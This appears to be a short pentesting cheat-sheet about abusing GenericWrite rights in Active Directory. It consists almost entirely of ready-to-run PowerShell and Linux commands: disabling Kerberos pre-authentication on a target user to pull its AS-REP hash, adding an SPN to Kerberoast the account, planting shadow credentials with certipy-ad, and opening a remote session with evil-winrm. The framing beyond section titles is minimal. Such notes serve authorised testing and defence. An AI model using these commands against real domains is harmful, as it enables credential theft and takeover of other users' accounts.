---
title: "GenericWrite"
date: 2024-7-13
tags: ["GenericWrite", "active driectory", "ad", "Windows"]
---

---
### Import PowerView.ps1 

```powershell
. .\PowerView.ps1
```

### Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit

```powershell
# Check target user
Get-DomainUser <target_user> | ConvertFrom-UACValue
```

```powershell
# Add UF_DONT_REQUIRE_PREAUTH bit
Set-DomainObject -Identity <target_user> -XOR @{useraccountcontrol=4194304} -Verbose
```

#### Get hash

```bash
# In local linux machine
impacket-GetNPUsers example.com/user -no-pass -dc-ip 10.10.11.10
```

### Abuse #2 : Kerberoasting by adding spn

#### Add spn

```powershell
# Add spn
setspn -a MSSQLSvc/example.com:1433 example.com\target_user
```

```powershell
# Check
Get-DomainUser target_user | Select serviceprincipalname
```

#### Runas

```powershell
$password = ConvertTo-SecureString 'password' -AsPlainText -Force
```

```powershell
$cred = New-Object System.Management.Automation.PSCredential('example.com\current_user', $password)
```

```powershell
Get-DomainSPNTicket -SPN "MSSQLSvc/object.local:1433" -Credential $Cred
```

### Abuse #3 : Add shadow credentials

#### certipy-ad (From Linux)

```bash
# Request a ticket
kinit <USERNAME>
```

```bash
# Import ticket
export KRB5CCNAME=/tmp/krb5cc_1000
```

```bash
# Pre-check (Optional)
certipy-ad find -username <USERNAME>@<DOMAIN> -k -target <TARGET_DOMAIN>
```

```bash
# Add shadow credentials
certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -account <TARGET_USER> -k -target <TARGET_DOMAIN>
```

```bash
# Remote with kerberos
KRB5CCNAME=./<TARGET_USER>.ccache evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
```

<br>